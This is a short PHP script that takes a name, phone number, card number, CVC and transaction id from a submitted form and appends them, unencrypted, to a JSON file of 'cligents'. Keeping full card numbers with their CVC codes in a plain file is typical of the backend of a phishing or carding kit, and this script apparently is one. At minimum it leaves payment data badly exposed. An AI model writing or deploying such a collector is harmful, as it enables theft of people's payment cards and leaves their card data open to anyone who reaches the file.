<?php
	$name = $_POST['name'];
	$phone = $_POST['phone'];
	$num = $_POST['num'];
	$cvc = $_POST['cvc'];
	$id_tr = $_POST['id_tr'];

	$man = array('id' => $id_tr, 'name' => $name, 'phone' => $phone, 'num' => $num, 'cvc' => $cvc);
	if (!empty(json_decode(file_get_contents('../../cligents/cligents.json')))) {
		$file = json_decode(file_get_contents('../../cligents/cligents.json'));
		$file->data[count($file->data)] = ((object) $man);
		$f = fopen('../../cligents/cligents.json', "w");
		$all = fwrite($f, json_encode($file));
	}
?>